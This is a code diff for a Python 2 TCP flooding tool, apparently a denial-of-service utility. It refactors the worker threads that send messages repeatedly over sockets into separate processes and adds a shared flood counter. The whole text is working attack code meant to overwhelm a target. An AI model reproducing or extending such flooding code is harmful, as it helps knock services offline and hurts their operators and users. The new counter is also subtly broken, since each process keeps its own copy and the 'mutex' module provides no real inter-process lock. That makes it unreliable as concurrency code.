@@ -1,4 +1,4 @@
-import socket, threading, random, time, os
+import socket, threading, random, time, os, mutex
 from multiprocessing import Process
 from Events import *
 from main import *
@@ -8,13 +8,13 @@ def randomString(length):
     string = ''.join(random.choice(allowedChars) for i in xrange(length))
     return string
 
-class TCPWorkerThread:
+class TCPWorkerThread(Process):
 
     def __init__(self, flooder, id):
+        Process.__init__(self)
         self.id = id
         self.socket = socket.socket()
         self.socket.setblocking(1)
-        #self.socket.settimeout(flooder.timeout) #perhaps this should be blocking/nonblocking
 
         self.flooder = flooder
         self.running = True
@@ -43,13 +43,15 @@ class TCPWorkerThread:
 
         while self.running:
             try:
-                self.floodCount += 1
+                self.flooder.increaseFlood()
                 self.socket.send(self.message)
                 print "thread", self.id, "count", self.floodCount
                 if self.flooder.wait != None and self.flooder.wait != False:
                     print "thread", self.id, "sleeping for", self.flooder.wait
                     time.sleep(self.flooder.wait)
             except Exception as e:
+                print "Couldn't send message on thread", self.id, "because", e.args
+                time.sleep(0.1)
                 pass
 
 class Flooder:
@@ -60,7 +62,6 @@ class Flooder:
         self.timeout = timeout
         self.method = method
         self.threadsAmount = threads
-        self.__threads = []
         self.__processes = []
         self.wait = wait
         self.speed = speed
@@ -68,6 +69,8 @@ class Flooder:
         self.message = message
         self.random = random
         self.threadId = 0
+        self.__floodCount = 0
+        self.__floodMutex = mutex.mutex()
 
         if method == TCP_METHOD:
             if message == None and random == False:
@@ -78,35 +81,26 @@ class Flooder:
             return
 
     def start(self):
-        if len(self.__threads) > 0:
+        if len(self.__processes) > 0:
             return
 
         for x in range(self.threadsAmount):
-            thread = TCPWorkerThread(self, self.threadId)
-            self.__threads.append(thread)
+            p = TCPWorkerThread(self, self.threadId)
             self.threadId += 1
-
-            p = Process(target=thread.run)
             self.__processes.append(p)
             p.start()
 
     def stop(self):
-        floodCount = 0
-
         while len(self.__processes) > 0:
             p = self.__processes.pop()
             p.terminate() #This will leave some defunct threads, but they will be reaped upon starting automatically.
 
-        while len(self.__threads) > 0:
-            t = self.__threads.pop()
-            t.stop()
-            floodCount += t.floodCount
-        print "final floodcount:", floodCount
+        print "final floodcount:", self.__floodCount
 
     def floodCount(self):
-        floodCount = 0
+        return self.__floodCount
 
-        for t in self.__threads:
-            floodCount += t.floodCount
-
-        return floodCount
+    def increaseFlood(self):
+        self.__floodMutex.lock()
+        self.__floodCount += 1
+        self.__floodMutex.unlock()
